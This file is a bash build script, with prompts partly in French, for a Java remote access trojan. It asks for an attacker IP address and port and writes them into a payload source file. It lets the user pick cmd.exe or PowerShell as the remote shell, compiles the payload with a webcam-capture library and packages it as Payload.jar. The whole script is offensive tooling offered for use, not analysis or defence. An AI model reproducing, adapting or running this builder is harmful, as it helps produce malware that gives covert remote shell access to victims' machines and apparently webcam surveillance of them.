#!/bin/bash.exe

read -p "Enter the ip address: " ip;
read -p "Enter the port: " port;
portImg=`echo $(($port-1))`
echo "Le port d'image sera $portImg"
echo "Native terminal:"
echo "1)cmd.exe"
echo "2)powershell.exe"
read shell;
echo $shell;

while (( $shell != 1 && $shell != 2 ))
do
	echo "Enter a valid number."
	read shell;
done

echo "Création du script avec l'ip $ip et le port $port ...";

mkdir ./out
mkdir src/rat/tmp
mv src/rat/Payload.java src/rat/tmp/Temp.java
cp src/rat/tmp/Temp.java src/rat/Payload.java

sed -i -e "s/AAAA/$ip/g" "src/rat/Payload.java"
sed -i -e "s/PPPP/$port/g" "src/rat/Payload.java"

if [ $shell -eq 1 ]
then
	sed -i -e "s/powershell.exe/cmd.exe/g" "src/rat/Payload.java"
fi

javac -cp ./src/rat  ./src/rat/Payload.java ./src/rat/commande/*.java ./src/rat/registry/*.java -d ./out/ -classpath ./libs/webcam-capture-0.3.9.jar
jar cvfm Payload.jar ./src/META-INF/MANIFEST.MF -C ./out/ .

rm src/rat/Payload.java
rm -rf ./out
mv src/rat/tmp/Temp.java src/rat/Payload.java
rm -rf src/rat/tmp
echo "Fini."
